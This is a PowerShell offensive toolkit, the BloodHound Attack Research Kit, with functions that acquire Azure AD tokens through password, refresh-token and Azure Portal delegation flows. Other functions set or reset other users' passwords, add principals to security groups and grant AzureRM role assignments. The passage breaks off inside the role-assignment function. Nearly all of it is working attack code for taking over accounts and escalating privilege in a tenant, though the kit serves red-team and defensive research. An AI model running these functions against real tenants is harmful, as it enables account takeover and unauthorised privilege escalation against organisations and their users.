# BloodHound Attack Research Kit (BARK)
# Author: Andy Robbins (@_wald0)
# License: GPLv3
# Threaded functions require PowerShell 7+

Function Parse-JWTToken {
    <#
    .DESCRIPTION
    Decodes a JWT token.

    Author: Vasil Michev
    .LINK
    https://www.michev.info/Blog/Post/2140/decode-jwt-access-and-id-tokens-via-powershell
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]$Token
    )

    #Validate as per https://tools.ietf.org/html/rfc7519
    #Access and ID tokens are fine, Refresh tokens will not work
    if (-not $Token.Contains(".") -or -not $Token.StartsWith("eyJ")) {
        Write-Error "Invalid token" -ErrorAction Stop
    }
 
    #Header
    $tokenheader = $Token.Split(".")[0].Replace('-', '+').Replace('_', '/')

    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenheader.Length % 4) {
        Write-Verbose "Invalid length for a Base-64 char array or string, adding ="
        $tokenheader += "="
    }

    Write-Verbose "Base64 encoded (padded) header: $tokenheader"

    #Convert from Base64 encoded string to PSObject all at once
    Write-Verbose "Decoded header:"
    $header = ([System.Text.Encoding]::ASCII.GetString([system.convert]::FromBase64String($tokenheader)) | convertfrom-json)
 
    #Payload
    $tokenPayload = $Token.Split(".")[1].Replace('-', '+').Replace('_', '/')

    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenPayload.Length % 4) {
        Write-Verbose "Invalid length for a Base-64 char array or string, adding ="
        $tokenPayload += "="
    }
    
    Write-Verbose "Base64 encoded (padded) payoad: $tokenPayload"

    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)


    $tokenArray = ([System.Text.Encoding]::ASCII.GetString($tokenByteArray) | ConvertFrom-Json)

    #Converts $header and $tokenArray from PSCustomObject to Hashtable so they can be added together.
    #I would like to use -AsHashTable in convertfrom-json. This works in pwsh 6 but for some reason Appveyor isnt running tests in pwsh 6.
    $headerAsHash = @{}
    $tokenArrayAsHash = @{}
    $header.psobject.properties | ForEach-Object { $headerAsHash[$_.Name] = $_.Value }
    $tokenArray.psobject.properties | ForEach-Object { $tokenArrayAsHash[$_.Name] = $_.Value }
    $output = $headerAsHash + $tokenArrayAsHash

    Write-Output $output
}

New-Variable -Name 'Parse-JWTTokenDefinition' -Value (Get-Command -Name "Parse-JWTToken") -Force
New-Variable -Name 'Parse-JWTTokenAst' -Value (${Parse-JWTTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AZRefreshTokenWithUsernamePassword {
    <#
    .DESCRIPTION
    Requests a JWT and refresh token from STS. This will fail if your user has MFA requiremnts.
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $ClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "openid offline_access"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
        
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AZRefreshTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-AZRefreshTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-AZRefreshTokenWithUsernamePasswordAst' -Value (${Get-AZRefreshTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithUsernamePassword {
    <#
    .DESCRIPTION
    Requests an MS Graph-scoped JWT from STS. This will fail if your user has MFA requiremnts.
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $ClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "https://graph.microsoft.com/.default"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
        
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-MSGraphTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-MSGraphTokenWithUsernamePasswordAst' -Value (${Get-MSGraphTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-ARMTokenWithUsernamePassword {
    <#
    .DESCRIPTION
    Requests an AzureRM-scoped JWT from STS. This will fail if your user has MFA requiremnts.
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $ClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "https://management.azure.com/.default"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
        
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-ARMTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-ARMTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-ARMTokenWithUsernamePasswordAst' -Value (${Get-ARMTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithClientCredentials {
    <#
    .DESCRIPTION
    Uses client credentials to request a token from STS with the MS Graph specified as the resource/intended audience
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $ClientID,

        [Parameter(Mandatory = $True)]
        [string]
        $ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantName,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type      =   "client_credentials"
        Scope           =   "https://graph.microsoft.com/.default"
        client_Id       =   $ClientID
        Client_Secret   =   $ClientSecret
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantName/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-MSGraphTokenWithClientCredentialsDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithClientCredentials") -Force
New-Variable -Name 'Get-MSGraphTokenWithClientCredentialsAst' -Value (${Get-MSGraphTokenWithClientCredentialsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithRefreshToken {
    <#
    .DESCRIPTION
    Supplies a refresh token to the STS, requesting an MS Graph-scoped JWT

    Based on RefreshTo-MSGraphToken by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        "grant_type"    =   "refresh_token"
        "refresh_token" =   $RefreshToken
        "scope"         =   "openid"
        "resource"      =   "https://graph.microsoft.com"
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI        "https://login.microsoftonline.com/$TenantId/oauth2/token?api-version=1.0" `
        -Method     "POST" `
        -Body       $Body

    $Token
}
New-Variable -Name 'Get-MSGraphTokenWithRefreshTokenDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithRefreshToken") -Force
New-Variable -Name 'Get-MSGraphTokenWithRefreshTokenAst' -Value (${Get-MSGraphTokenWithRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithPortalAuthRefreshToken {
    <#
    .DESCRIPTION
    Supplies a Portal Auth Refresh Token to the Azure Portal DelegationToken endpoint and requests an MS Graph-scoped JWT

    Based on Token Tactics by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $PortalAuthRefreshToken,

        [Parameter(Mandatory = $False)]
        [string]
        $AltPortalAuthRefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $True)]
        [string]
        $PortalID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        extensionName = "Microsoft_AAD_UsersAndTenants"
        resourceName = "microsoft.graph"
        tenant = $TenantID
        portalAuthorization = $PortalAuthRefreshToken
        altPortalAuthorization = $AltPortalAuthRefreshToken
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $WebSession.Cookies.Add((New-Object System.Net.Cookie("portalId", ($PortalID), "/", ".portal.azure.com")))

    $TokenRequest = Invoke-WebRequest `
        -UseBasicParsing `
        -Uri "https://portal.azure.com/api/DelegationToken?feature.cacheextensionapp=false&feature.internalgraphapiversion=true&feature.tokencaching=false" `
        -Method "POST" `
        -WebSession $WebSession `
        -ContentType "application/json" `
        -Body $($body | ConvertTo-Json) 
    $GraphJWT = (($TokenRequest.Content | ConvertFrom-JSON).value).authHeader

    $GraphJWT
}
New-Variable -Name 'Get-MSGraphTokenWithPortalAuthRefreshTokenDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithPortalAuthRefreshToken") -Force
New-Variable -Name 'Get-MSGraphTokenWithPortalAuthRefreshTokenAst' -Value (${Get-MSGraphTokenWithPortalAuthRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-ARMTokenWithPortalAuthRefreshToken {
    <#
    .DESCRIPTION
    Supplies a Portal Auth Refresh Token to the Azure Portal DelegationToken endpoint and requests an AzureRM-scoped JWT

    Based on Token Tactics by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $PortalAuthRefreshToken,

        [Parameter(Mandatory = $False)]
        [string]
        $AltPortalAuthRefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        extensionName = "Microsoft_Azure_PIMCommon"
        resourceName = ""
        tenant = $TenantID
        portalAuthorization = $PortalAuthRefreshToken
        altPortalAuthorization = $AltPortalAuthRefreshToken
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $WebSession.Cookies.Add((New-Object System.Net.Cookie("portalId", ($PortalID), "/", ".portal.azure.com")))

    $TokenRequest = Invoke-WebRequest `
        -UseBasicParsing `
        -Uri "https://portal.azure.com/api/DelegationToken?feature.cacheextensionapp=false&feature.internalgraphapiversion=true&feature.tokencaching=false" `
        -Method "POST" `
        -WebSession $WebSession `
        -ContentType "application/json" `
        -Body $($body | ConvertTo-Json) 
    $ARMJWT = (($TokenRequest.Content | ConvertFrom-JSON).value).authHeader

    $ARMJWT
}
New-Variable -Name 'Get-ARMTokenWithPortalAuthRefreshTokenDefinition' -Value (Get-Command -Name "Get-ARMTokenWithPortalAuthRefreshToken") -Force
New-Variable -Name 'Get-ARMTokenWithPortalAuthRefreshTokenAst' -Value (${Get-ARMTokenWithPortalAuthRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureRMTokenWithClientCredentials {
    <#
    .DESCRIPTION
    Uses client credentials to request a token from STS with Azure Resource Manager specified as the resource/intended audience
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $ClientID,

        [Parameter(Mandatory = $True)]
        [string]
        $ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantName,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type      =   "client_credentials"
        Scope           =   "https://management.azure.com/.default"
        client_Id       =   $ClientID
        Client_Secret   =   $ClientSecret
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantName/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureRMTokenWithClientCredentialsDefinition' -Value (Get-Command -Name "Get-AzureRMTokenWithClientCredentials") -Force
New-Variable -Name 'Get-AzureRMTokenWithClientCredentialsAst' -Value (${Get-AzureRMTokenWithClientCredentialsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-ARMTokenWithRefreshToken {
    <#
    .DESCRIPTION
    Supplies a refresh token to the STS, requesting an AzureRM-scoped JWT

    Based on RefreshTo-AzureCoreManagementToken by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        "grant_type"    =   "refresh_token"
        "refresh_token" =   $RefreshToken
        "scope"         =   "openid"
        "resource"      =   "https://management.core.windows.net"
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/token?api-version=1.0" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-ARMTokenWithRefreshTokenDefinition' -Value (Get-Command -Name "Get-ARMTokenWithRefreshToken") -Force
New-Variable -Name 'Get-ARMTokenWithRefreshTokenAst' -Value (${Get-ARMTokenWithRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzurePortalTokenWithRefreshToken {
    <#
    .DESCRIPTION
    Supplies a refresh token to the STS, requesting an Azure Portal-scoped JWT

    Based on Token Tactics by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        "grant_type"    =   "refresh_token"
        "refresh_token" =   $RefreshToken
        "scope"         =   "openid"
        "resource"      =   "74658136-14ec-4630-ad9b-26e160ff0fc6"
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.windows.net/$TenantId/oauth2/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzurePortalTokenWithRefreshTokenDefinition' -Value (Get-Command -Name "Get-AzurePortalTokenWithRefreshToken") -Force
New-Variable -Name 'Get-AzurePortalTokenWithRefreshTokenAst' -Value (${Get-AzurePortalTokenWithRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureKeyVaultTokenWithClientCredentials {
    <#
    .DESCRIPTION
    Uses client credentials to request a token from STS with Azure Vault specified as the resource/intended audience
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $ClientID,

        [Parameter(Mandatory = $True)]
        [string]
        $ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantName,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type      =   "client_credentials"
        Scope           =   "https://vault.azure.net/.default"
        client_Id       =   $ClientID
        Client_Secret   =   $ClientSecret
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantName/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureKeyVaultTokenWithClientCredentialsDefinition' -Value (Get-Command -Name "Get-AzureKeyVaultTokenWithClientCredentials") -Force
New-Variable -Name 'Get-AzureKeyVaultTokenWithClientCredentialsAst' -Value (${Get-AzureKeyVaultTokenWithClientCredentialsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureKeyVaultTokenWithUsernamePassword {
    <#
    .DESCRIPTION
    Requests an Azure Key Vault-scoped JWT from STS. This will fail if your user has MFA requiremnts.
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $ClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "https://vault.azure.net/.default"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
        
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureKeyVaultTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-AzureKeyVaultTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-AzureKeyVaultTokenWithUsernamePasswordAst' -Value (${Get-AzureKeyVaultTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Set-AZUserPassword {
    <#
    .SYNOPSIS
        Attempts to set an AzureAD user password to a provided value. Returns the raw payload from the Graph API.
        If successful, the Graph API response status code will be "204".

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to set an AzureAD user password to a provided value

    .PARAMETER Token
        An MS Graph scoped JWT for an AAD user or service principal with the ability to set the target user's password

    .PARAMETER TargetUserID
        The unique identifier of the target user you want to update the password for

    .PARAMETER Password
        The new password you want the target user to have

    .EXAMPLE
        Set-AZUserPassword -Token $MGToken -TargetUserID "f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf" -Password "SuperSafePassword12345"

        Description
        -----------
        Sets the user with object ID starting with "f5e..."'s password to "SuperSafePassword12345"

    .LINK
        https://docs.microsoft.com/en-us/graph/api/passwordauthenticationmethod-resetpassword?view=graph-rest-beta&tabs=http#request
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetUserID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Password
    )

    $Body = @{
        passwordProfile = @{
            forceChangePasswordNextSignIn = "false"
            password = $Password
        }
    }

    $SetPasswordRequest = Invoke-WebRequest `
        -UseBasicParsing `
        -Uri "https://graph.microsoft.com/v1.0/users/$TargetUserID" `
        -Method "PATCH" `
        -Headers @{
            "Authorization"="Bearer $Token"
        } `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-Json)

    $SetPasswordRequest

}

Function Reset-AZUserPassword {
    <#
    .SYNOPSIS
        Attempts to reset an AzureAD user password. If successful, returns the new temporary password for the user.
        This will only work if the supplied JWT is associated with a user. It will not work if the JWT is associated with a service principal.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to reset an AzureAD user password. If successful, returns the new temporary password for the user.

    .PARAMETER Token
        An Azure Portal scoped JWT for an AAD user with the ability to reset the target user's password

    .PARAMETER TargetUserID
        The unique identifier of the target user you want to reset the password for

    .EXAMPLE
        Reset-AZUserPassword -Token $MGToken -TargetUserID "bf51..."

        Description
        -----------
        Reset the password for the user with object ID starting with "bf51..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetUserID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    $ResetPasswordRequest = Invoke-WebRequest -UseBasicParsing -Uri "https://main.iam.ad.ext.azure.com/api/PasswordReset/ResetPasswordByUpn?userPrincipalName=$($TargetUserID)" `
        -Method "PUT" `
        -Headers @{
            "Authorization"="Bearer $($Token)"
            "x-ms-client-request-id"= (New-Guid).guid
        } `
        -ContentType "application/json" `
        -Body "{}"
    
    $ResetPasswordRequest

}

Function Add-AZMemberToGroup {
    <#
    .SYNOPSIS
        Attempts to add a principal to an existing AzureAD security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to add a principal to an existing AzureAD security group

    .PARAMETER PrincipalID
        The ID of the principal you want to add to the group

    .PARAMETER TargetGroupId
        The globally unique ID of the target security group

    .PARAMETER Token
        The MS Graph-scoped JWT for the princpal you are authenticating as

    .EXAMPLE
        C:\PS> Add-AZMemberToGroup `
            -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -Token $MGToken

        Description
        -----------
        Attempt to add the principal with ID starting with "028..." to the AzureAD group with ID starting with "b98..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($PrincipalID)"
    }

    $AddMemberRequest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($Token)" } `
        -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/members/`$ref" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'
        $Success = $True

    $AddMemberRequest
}

Function Get-AZGroupMembers {
    <#
    .SYNOPSIS
        Read the members of an AzureAD group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Read the members of an AzureAD group

    .PARAMETER GroupId
        The globally unique ID of the target security group

    .PARAMETER Token
        The MS Graph-scoped JWT for the princpal you are authenticating as

    .EXAMPLE
        C:\PS> Get-AZGroupMembers `
            -GroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -Token $MGToken

        Description
        -----------
        Read the members of the group whose object ID starts with "b98..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://graph.microsoft.com/v1.0/groups/$($GroupId)/members" 
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $AZGroupMembers += $Results.value
        } else {
            $AZGroupMembers += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $AZGroupMembers
}

Function Get-AzureRMRoleDefinitions {
    <#
    .SYNOPSIS
        Gets the current list of available AzureRM roles

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Collects all roles available in AzureRM at the subscription object level

    .PARAMETER Token
        An AzureRM scoped JWT for an AAD principal

    .PARAMETER SubscriptionID
        The unique identifier for your target subscription

    .EXAMPLE
        Get-AzureRMRoleDefinitions -Token $ARMToken -SubscriptionID "bf51..."

        Description
        -----------
        List all available AzureRM Role Definitions for the subsription whose ID starts with "bf51..."

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    $SubscriptionRoles = $null
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Authorization/roleDefinitions?api-version=2018-01-01-preview"
    do {
        $Results = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $SubscriptionRoles += $Results.value
        } else {
            $SubscriptionRoles += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    ForEach ($Role in $SubscriptionRoles) {
        # Return an object of the AzureRM role
        $AzureRMRole = New-Object PSObject -Property @{
            AzureRMRoleDisplayName  = $Role.properties.roleName
            AzureRMRoleID           = $Role.id
        }
        $AzureRMRole
    }
}

Function New-AzureRMRoleAssignment {
    <#
    .SYNOPSIS
        Grant an AzureRM role assignment to a principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Grants an AzureRM role assignment to an existing AzureAD principal. You must wait at least 2 minutes before using the role assignment: https://docs.microsoft.com/en-us/azure/key-vault/general/rbac-guide?tabs=azure-cli#known-limits-and-performance

    .PARAMETER PrincipalId
        The object ID of the existing AAD principal to which you are granting the AzureRM role

    .PARAMETER AzureRMRoleID
        The ID of the AzureRM Role you are granting to the AAD principal

    .PARAMETER TargetObjectID
        The ID of the AzureRM object you are scoping the role assignment against

    .PARAMETER Token
        The AzureRM scoped JWT for a principal with the ability to add new role assignments to the target object.

    .EXAMPLE
        C:\PS> New-AzureRMRoleAssignment `
            -PrincipalId "e21abf7a-1fe6-405f-90c0-46e1ce5360e6" `
            -AzureRMRoleID "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/4465e953-8ced-4406-a58e-0f6e3f3b530b" `
            -TargetObjectID "f1816681-4df5-4a31-acfa-922401687008" `
            -Token $ARMToken

        Description
        -----------
        Grant the AzureRM role with ID of "/subscriptions/f18.../providers/Microsoft.Authorization/roleDefinitions/446..." to the principal with ObjectID of "e21..." against the object whose ID starts with "f18..."

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
